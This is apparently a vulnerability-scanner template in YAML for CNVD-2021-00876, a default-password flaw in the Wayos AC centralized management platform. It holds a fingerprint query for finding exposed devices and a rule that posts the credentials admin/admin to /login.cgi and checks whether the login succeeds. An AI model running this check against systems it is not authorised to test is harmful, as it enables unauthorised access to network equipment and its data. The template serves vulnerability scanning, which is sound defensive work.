name: Wayos_AC_Centralized_management_system_Default_weak_password__CNVD_2021_00876
transport: http
set: {}
detail:
  dock: title="AC集中管理平台" && body="login_25.jpg"
  product: Wayos AC Centralized management system
  homepage: http://www.wayos.com/
  impact: <p>An attacker can use this vulnerability to obtain sensitive information.<br></p>
  description: 'Shenzhen Weimeng Technology Co., Ltd. is a leading network equipment
    and smart home product solution provider in China. Its main products include wireless
    gateway, switch, foreign VPN, dual band top-down AP, etc.




    Weak password vulnerability exists in AC centralized management platform, which
    can be used by attackers to obtain sensitive information.'
rules:
  r1:
    method: POST
    path: /login.cgi
    follow_redirects: true
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: user=admin&password=admin
    expression: response.status == 200 && !response.body.bcontains(b'flag=0')
expression: r1()
